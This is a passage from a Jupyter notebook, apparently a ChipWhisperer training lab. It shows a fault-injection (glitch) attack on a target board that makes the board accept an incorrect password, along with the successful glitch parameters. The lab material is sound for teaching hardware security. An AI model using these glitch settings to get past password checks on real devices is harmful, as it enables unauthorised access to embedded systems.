    "scope.adc.timeout = 0.1\n",
    "scope.glitch.repeat = 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CWbytearray(b'01')\n",
      "1.953125 -3.90625 48\n",
      "🐙"
     ]
    }
   ],
   "source": [
    "reboot_flush()\n",
    "scope.glitch.offset = -4\n",
    "scope.glitch.width = 2.0\n",
    "scope.glitch.ext_offset = 48\n",
    "if scope.adc.state:\n",
    "    # can detect crash here (fast) before timing out (slow)\n",
    "    print(\"Trigger still high!\")\n",
    "    gc.add(\"reset\")\n",
    "\n",
    "    #Device is slow to boot?\n",
    "    reboot_flush()\n",
    "\n",
    "scope.arm()\n",
    "target.simpleserial_write('p', bytearray([0x00]*5)) #send an incorrect password\n",
    "\n",
    "ret = scope.capture()\n",
    "\n",
    "if ret:\n",
    "    print('Timeout - no trigger')\n",
    "\n",
    "    #Device is slow to boot?\n",
    "    reboot_flush()\n",
    "\n",
    "else:\n",
    "    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50) #For loop check\n",
    "    \n",
    "    if not val['valid']: #fill in with invalid response detection\n",
    "        print('Invalid result')\n",
    "    else:\n",
    "        payl = int.from_bytes(val['payload'], byteorder='little', signed=True)\n",
    "        if payl == 1: # replace this\n",
    "            print(val['payload'])\n",
    "            print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)\n",
    "            print(\"🐙\", end=\"\")\n",
    "        else:\n",
    "            print(\"Nothing happened.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "cw",
   "language": "python",
   "name": "cw"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
